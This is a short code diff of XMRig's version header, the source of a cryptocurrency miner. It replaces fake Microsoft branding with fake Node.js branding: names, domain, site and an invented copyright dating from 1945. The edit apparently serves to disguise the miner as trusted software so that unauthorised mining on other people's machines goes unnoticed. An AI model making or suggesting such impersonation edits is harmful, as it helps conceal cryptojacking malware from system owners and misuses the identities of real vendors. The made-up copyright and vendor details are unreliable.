@@ -19,14 +19,14 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
-#define APP_ID        "Microsoft"
-#define APP_NAME      "Microsoft"
-#define APP_DESC      "Microsoft"
-#define APP_VERSION   "2.0.2.4"
-#define APP_DOMAIN    "microsoft.com"
-#define APP_SITE      "www.microsoft.com"
-#define APP_COPYRIGHT "Copyright (C) 1945-2027 Microsoft"
-#define APP_KIND      "Microsoft"
+#define APP_ID        "Nodejs"
+#define APP_NAME      "Nodejs"
+#define APP_DESC      "Nodejs"
+#define APP_VERSION   "2.0.2.2"
+#define APP_DOMAIN    "Nodejs.com"
+#define APP_SITE      "www.Nodejs.com"
+#define APP_COPYRIGHT "Copyright (C) 1945-2026 Nodejs"
+#define APP_KIND      "Nodejs"
 
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  21
